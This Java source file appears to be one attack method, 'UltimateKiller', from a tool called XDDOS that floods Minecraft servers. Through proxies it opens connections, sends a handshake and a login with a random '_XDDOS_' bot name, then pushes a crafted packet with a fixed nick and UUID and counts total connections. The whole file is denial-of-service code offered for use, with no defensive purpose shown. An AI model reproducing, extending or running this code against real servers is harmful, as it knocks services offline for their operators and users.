package XD.XDDOS.methods;

import java.security.SecureRandom;

import XD.XDDOS.XDDOS;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import XD.XDDOS.utils.LoginRequest;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;

public class UltimateKiller
implements Method {

    private byte[] handshakebytes = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();

    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshakebytes));
        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
        try {
          channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest((new SecureRandom()).nextInt(99) + "_XDDOS_" + (new SecureRandom()).nextInt(99)).getWrappedPacket())));
          String nick = "XDDOS";
          bbbb.writeBytes(nick);
          String uuid = "a2xSdioDOANdo92JIdIADc";
          bbbb.write(uuid.length() + nick.length() + 3);
          bbbb.write(2);
          bbbb.write(uuid.length());
          bbbb.writeBytes(uuid);
          bbbb.write(nick.length());
          bbbb.writeBytes(nick);
        }
        catch (IOException e) {
          e.printStackTrace();
        }
        channel.writeAndFlush(b);
        channel.writeAndFlush(bbbb);
        NettyBootstrap.integer++;
        NettyBootstrap.totalConnections++;
        channel.close();
      }

}
